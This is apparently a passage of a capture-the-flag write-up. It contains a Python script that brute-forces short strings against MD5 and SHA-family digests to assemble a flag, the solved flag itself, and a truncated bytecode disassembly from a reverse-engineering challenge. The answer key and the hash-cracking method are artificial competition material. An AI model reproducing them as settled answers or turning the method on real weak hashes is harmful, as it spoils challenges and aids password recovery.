<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">c = [<span class="string">&quot;bba78e7d3d6ea696bfef6e87a26a6c03&quot;</span>,</span><br><span class="line"><span class="string">&quot;894461aba3e5e2724278cfc40fa15dc1510b0cd56430fec9fc8a90d6d8ebe5f7&quot;</span>,</span><br><span class="line"><span class="string">&quot;092ca0da5f25c595eae6cc725dc12ae75889a639d205733223cb9cfaeaa702a521971e57f768079b03d53c8f092bb2c597cc3adb4a98224a144c5d62461beb52&quot;</span>,</span><br><span class="line"><span class="string">&quot;122c597083bd438b7f6d72af75d025948899647711b806bdd2cd82fa69713db3&quot;</span>,</span><br><span class="line"><span class="string">&quot;153812ae5fea0b73a011bf28bd7cea93644437c3fe3260b7b2d7e1e2f9f46bde&quot;</span>,</span><br><span class="line"><span class="string">&quot;24296a0d1555ad424b04dd5f6268c5613dae32cde8a469ca8c9065b9&quot;</span>,</span><br><span class="line"><span class="string">&quot;15d46f8eae648f5945c4605b15e0507836ee1251b74de2e95bf9394d&quot;</span>,</span><br><span class="line"><span class="string">&quot;9afdf5d1027172492a32833975a69a1e501e6f824d3e5a7121ad18af&quot;</span>,</span><br><span class="line"><span class="string">&quot;2b7655eb53f6f92086e58da465c6733bd8d8a1a3&quot;</span>,</span><br><span class="line"><span class="string">&quot;a44fce0412ae28173cf036700c3f1cc8c7a279c6&quot;</span>,</span><br><span class="line"><span class="string">&quot;7356ea99a4fa12c6a3ed8ecc1e78a7bb28cdc1208962848646cf34e0d836f420cf594606cde74bec1dc2efe511dff0dd07b558bd0c7d01a526de2e9c25d47a6f&quot;</span>,</span><br><span class="line"><span class="string">&quot;cc5c3fe6e7356a26a134cff5633349f597c40a9d&quot;</span>,</span><br><span class="line"><span class="string">&quot;757d22f85733770bae59cc857dcfc369db29031459421b808377cf06bc9881ad&quot;</span>,</span><br><span class="line"><span class="string">&quot;a2c7bdf97e3c761c431f8891dcc39fa9&quot;</span>,</span><br><span class="line"><span class="string">&quot;0606c0e8f78de4d7a78522a5ae2f7b70e31e669e6e2a16e11c393e4443069813&quot;</span>,</span><br><span class="line"><span class="string">&quot;cb6c6c7cc8189868e1feaae773f947908233cdcc&quot;</span>,</span><br><span class="line"><span class="string">&quot;2cb5169af85bd3122276f8b0a731ed2ea30c8bef366bfafe76b5e7db&quot;</span>,</span><br><span class="line"><span class="string">&quot;d1de3eac41792a7f498dae8f439bf16d&quot;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">table = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">0</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">1</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)     </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha512(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">2</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">3</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">4</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha224(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">5</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha224(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">6</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha224(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">7</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)     </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha1(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">8</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)        </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha1(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">9</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha512(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">10</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha1(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">11</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">12</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)              </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">13</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">14</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha1(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">15</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">2</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha224(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">16</span>]:</span><br><span class="line">        flag += m</span><br><span class="line"><span class="built_in">print</span>(flag)       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table,repeat=<span class="number">3</span>):</span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(m.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span> == c[<span class="number">17</span>]:</span><br><span class="line">        flag += m</span><br><span class="line">flag += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;YOU&#x27;vE_c0m3_To_UNDerS7anD_Ha5H_GDIbgdF3EocT&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h2><h3 id="pycode"><a href="#pycode" class="headerlink" title="pycode"></a>pycode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line">  0           0 RESUME                   0</span><br><span class="line"></span><br><span class="line">  1           2 LOAD_CONST               0 (0)</span><br><span class="line">              4 LOAD_CONST               1 (None)</span><br><span class="line">              6 IMPORT_NAME              0 (base64)</span><br><span class="line">              8 STORE_NAME               0 (base64)</span><br><span class="line"></span><br><span class="line">  2          10 LOAD_CONST               2 (&#x27;*******************&#x27;)</span><br><span class="line">             12 STORE_NAME               1 (flag)</span><br><span class="line"></span><br><span class="line">  3          14 LOAD_CONST               3 (&#x27;&#x27;)</span><br><span class="line">             16 STORE_NAME               2 (value)</span><br><span class="line"></span><br><span class="line">  4          18 LOAD_CONST               3 (&#x27;&#x27;)</span><br><span class="line">             20 STORE_NAME               3 (output)</span><br><span class="line"></span><br><span class="line">  5          22 PUSH_NULL</span><br><span class="line">             24 LOAD_NAME                4 (range)</span><br><span class="line">             26 LOAD_CONST               4 (1000)</span><br><span class="line">             28 PRECALL                  1</span><br><span class="line">             32 CALL                     1</span><br><span class="line">             42 GET_ITER</span><br><span class="line">        &gt;&gt;   44 FOR_ITER                24 (to 94)</span><br><span class="line">             46 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line">  6          48 LOAD_CONST               5 (1024)</span><br><span class="line">             50 STORE_NAME               6 (w)</span><br><span class="line"></span><br><span class="line">  7          52 LOAD_NAME                6 (w)</span><br><span class="line">             54 LOAD_CONST               6 (3)</span><br><span class="line">             56 BINARY_OP                6 (%)</span><br><span class="line">             60 STORE_NAME               7 (x)</span><br><span class="line"></span><br><span class="line">  8          62 LOAD_NAME                6 (w)</span><br><span class="line">             64 LOAD_CONST               7 (9)</span><br><span class="line">             66 BINARY_OP                2 (//)</span><br><span class="line">             70 STORE_NAME               8 (y)</span><br><span class="line"></span><br><span class="line">  9          72 LOAD_NAME                7 (x)</span><br><span class="line">             74 LOAD_NAME                8 (y)</span><br><span class="line">             76 BINARY_OP                5 (*)</span><br><span class="line">             80 STORE_NAME               9 (z)</span><br><span class="line"></span><br><span class="line"> 10          82 LOAD_NAME                6 (w)</span><br><span class="line">             84 LOAD_NAME                9 (z)</span><br><span class="line">             86 BINARY_OP               23 (-=)</span><br><span class="line">             90 STORE_NAME               6 (w)</span><br><span class="line">             92 JUMP_BACKWARD           25 (to 44)</span><br><span class="line"></span><br><span class="line"> 11     &gt;&gt;   94 PUSH_NULL</span><br><span class="line">             96 LOAD_NAME                4 (range)</span><br><span class="line">             98 LOAD_CONST               8 (10000)</span><br><span class="line">            100 PRECALL                  1</span><br><span class="line">            104 CALL                     1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                24 (to 166)</span><br><span class="line">            118 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line"> 12         120 LOAD_CONST               9 (20)</span><br><span class="line">            122 STORE_NAME               6 (w)</span><br><span class="line"></span><br><span class="line"> 13         124 LOAD_NAME                6 (w)</span><br><span class="line">            126 LOAD_CONST              10 (6)</span><br><span class="line">            128 BINARY_OP                6 (%)</span><br><span class="line">            132 STORE_NAME               7 (x)</span><br><span class="line"></span><br><span class="line"> 14         134 LOAD_NAME                6 (w)</span><br><span class="line">            136 LOAD_CONST               6 (3)</span><br><span class="line">            138 BINARY_OP                2 (//)</span><br><span class="line">            142 STORE_NAME               8 (y)</span><br><span class="line"></span><br><span class="line"> 15         144 LOAD_NAME                7 (x)</span><br><span class="line">            146 LOAD_NAME                8 (y)</span><br><span class="line">            148 BINARY_OP                5 (*)</span><br><span class="line">            152 STORE_NAME               9 (z)</span><br><span class="line"></span><br><span class="line"> 16         154 LOAD_NAME                6 (w)</span><br><span class="line">            156 LOAD_NAME                9 (z)</span><br><span class="line">            158 BINARY_OP               13 (+=)</span><br><span class="line">            162 STORE_NAME               6 (w)</span><br><span class="line">            164 JUMP_BACKWARD           25 (to 116)</span><br><span class="line"></span><br><span class="line"> 17     &gt;&gt;  166 PUSH_NULL</span><br><span class="line">            168 LOAD_NAME                4 (range)</span><br><span class="line">            170 LOAD_CONST               4 (1000)</span><br><span class="line">            172 PRECALL                  1</span><br><span class="line">            176 CALL                     1</span><br><span class="line">            186 GET_ITER</span><br><span class="line">        &gt;&gt;  188 FOR_ITER                24 (to 238)</span><br><span class="line">            190 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line"> 18         192 LOAD_CONST               5 (1024)</span><br><span class="line">            194 STORE_NAME               6 (w)</span><br><span class="line"></span><br><span class="line"> 19         196 LOAD_NAME                6 (w)</span><br><span class="line">            198 LOAD_CONST               6 (3)</span><br><span class="line">            200 BINARY_OP                6 (%)</span><br><span class="line">            204 STORE_NAME               7 (x)</span><br><span class="line"></span><br><span class="line"> 20         206 LOAD_NAME                6 (w)</span><br><span class="line">            208 LOAD_CONST               7 (9)</span><br><span class="line">            210 BINARY_OP                2 (//)</span><br><span class="line">            214 STORE_NAME               8 (y)</span><br><span class="line"></span><br><span class="line"> 21         216 LOAD_NAME                7 (x)</span><br><span class="line">            218 LOAD_NAME                8 (y)</span><br><span class="line">            220 BINARY_OP                5 (*)</span><br><span class="line">            224 STORE_NAME               9 (z)</span><br><span class="line"></span><br><span class="line"> 22         226 LOAD_NAME                6 (w)</span><br><span class="line">            228 LOAD_NAME                9 (z)</span><br><span class="line">            230 BINARY_OP               23 (-=)</span><br><span class="line">            234 STORE_NAME               6 (w)</span><br><span class="line">            236 JUMP_BACKWARD           25 (to 188)</span><br><span class="line"></span><br><span class="line"> 23     &gt;&gt;  238 PUSH_NULL</span><br><span class="line">            240 LOAD_NAME                4 (range)</span><br><span class="line">            242 LOAD_CONST               8 (10000)</span><br><span class="line">            244 PRECALL                  1</span><br><span class="line">            248 CALL                     1</span><br><span class="line">            258 GET_ITER</span><br><span class="line">        &gt;&gt;  260 FOR_ITER                24 (to 310)</span><br><span class="line">            262 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line"> 24         264 LOAD_CONST               9 (20)</span><br><span class="line">            266 STORE_NAME               6 (w)</span><br><span class="line"></span><br><span class="line"> 25         268 LOAD_NAME                6 (w)</span><br><span class="line">            270 LOAD_CONST              10 (6)</span><br><span class="line">            272 BINARY_OP                6 (%)</span><br><span class="line">            276 STORE_NAME               7 (x)</span><br><span class="line"></span><br><span class="line"> 26         278 LOAD_NAME                6 (w)</span><br><span class="line">            280 LOAD_CONST               6 (3)</span><br><span class="line">            282 BINARY_OP                2 (//)</span><br><span class="line">            286 STORE_NAME               8 (y)</span><br><span class="line"></span><br><span class="line"> 27         288 LOAD_NAME                7 (x)</span><br><span class="line">            290 LOAD_NAME                8 (y)</span><br><span class="line">            292 BINARY_OP                5 (*)</span><br><span class="line">            296 STORE_NAME               9 (z)</span><br><span class="line"></span><br><span class="line"> 28         298 LOAD_NAME                6 (w)</span><br><span class="line">            300 LOAD_NAME                9 (z)</span><br><span class="line">            302 BINARY_OP               13 (+=)</span><br><span class="line">            306 STORE_NAME               6 (w)</span><br><span class="line">            308 JUMP_BACKWARD           25 (to 260)</span><br><span class="line"></span><br><span class="line"> 29     &gt;&gt;  310 PUSH_NULL</span><br><span class="line">            312 LOAD_NAME                4 (range)</span><br><span class="line">            314 LOAD_CONST               0 (0)</span><br><span class="line">            316 PUSH_NULL</span><br><span class="line">            318 LOAD_NAME               10 (len)</span><br><span class="line">            320 LOAD_NAME                1 (flag)</span><br><span class="line">            322 PRECALL                  1</span><br><span class="line">            326 CALL                     1</span><br><span class="line">            336 PRECALL                  2</span><br><span class="line">            340 CALL                     2</span><br><span class="line">            350 GET_ITER</span><br><span class="line">        &gt;&gt;  352 FOR_ITER                38 (to 430)</span><br><span class="line">            354 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line"> 30         356 LOAD_NAME                1 (flag)</span><br><span class="line">            358 LOAD_NAME                5 (i)</span><br><span class="line">            360 BINARY_SUBSCR</span><br><span class="line">            370 STORE_NAME              11 (temp)</span><br><span class="line"></span><br><span class="line"> 31         372 PUSH_NULL</span><br><span class="line">            374 LOAD_NAME               12 (chr)</span><br><span class="line">            376 PUSH_NULL</span><br><span class="line">            378 LOAD_NAME               13 (ord)</span><br><span class="line">            380 LOAD_NAME               11 (temp)</span><br><span class="line">            382 PRECALL                  1</span><br><span class="line">            386 CALL                     1</span><br><span class="line">            396 LOAD_CONST              11 (8)</span><br><span class="line">            398 BINARY_OP               12 (^)</span><br><span class="line">            402 PRECALL                  1</span><br><span class="line">            406 CALL                     1</span><br><span class="line">            416 STORE_NAME              11 (temp)</span><br><span class="line"></span><br><span class="line"> 32         418 LOAD_NAME                2 (value)</span><br><span class="line">            420 LOAD_NAME               11 (temp)</span><br><span class="line">            422 BINARY_OP               13 (+=)</span><br><span class="line">            426 STORE_NAME               2 (value)</span><br><span class="line">            428 JUMP_BACKWARD           39 (to 352)</span><br><span class="line"></span><br><span class="line"> 33     &gt;&gt;  430 PUSH_NULL</span><br><span class="line">            432 LOAD_NAME                4 (range)</span><br><span class="line">            434 PUSH_NULL</span><br><span class="line">            436 LOAD_NAME               10 (len)</span><br><span class="line">            438 LOAD_NAME                1 (flag)</span><br><span class="line">            440 PRECALL                  1</span><br><span class="line">            444 CALL                     1</span><br><span class="line">            454 